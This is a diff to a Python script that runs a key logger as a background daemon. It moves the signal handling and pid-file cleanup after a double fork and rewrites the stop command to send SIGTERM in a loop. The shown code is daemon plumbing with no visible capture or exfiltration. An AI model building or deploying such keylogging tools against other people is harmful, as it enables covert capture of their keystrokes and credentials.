@@ -9,10 +9,6 @@ import signal
 pidFile = '/tmp/keylog.pid'
 
 
-def sigTermTermination(signalNo,  frame):
-    raise SystemExit('Key logger terminated')
-
-
 def processTerminator(signalNumber,  functionReference):
     # wait for child processes to complete and destroy them
     while True:
@@ -53,15 +49,17 @@ if sys.argv[1] == 'start':
         except OSError as e:
             raise RuntimeError(f'fork #2 failed: {e}')
 
+        def sigTermTermination(signo,  frame):
+            raise SystemExit('Key logger terminated')
+
+        atexit.register(lambda: os.remove(pidFile))
+        signal.signal(signal.SIGTERM,  sigTermTermination)
+
         try:
             with open(pidFile,  'w') as fileHandler:
                 fileHandler.write(str(os.getpid()))
         except Exception as err:
             raise Exception(err)
-
-        atexit.register(lambda: os.remove(pidFile))
-
-        signal.signal(signal.SIGTERM,  sigTermTermination)
 
         def keyPressed(key):
             if str(key) == 'Key.esc':
@@ -77,13 +75,19 @@ if sys.argv[1] == 'start':
         print(err)
         raise SystemExit('Exit Code: ' + str(1))
 
+
 # detect stop command and send signal to kill daemon
 elif sys.argv[1] == 'stop':
     if os.path.exists(pidFile):
         with open(pidFile) as fileHandler:
             print("Killing")
             pid = int(fileHandler.readline().rstrip())
-            os.kill(pid,  signal.SIGTERM)
+            print(pid)
+            while True:
+                try:
+                    os.kill(pid,  signal.SIGTERM)
+                except Exception as err:
+                    raise SystemExit()
     else:
         print('Key logger is not currently running!')
         raise SystemExit('Exit Code: ' + str(1))
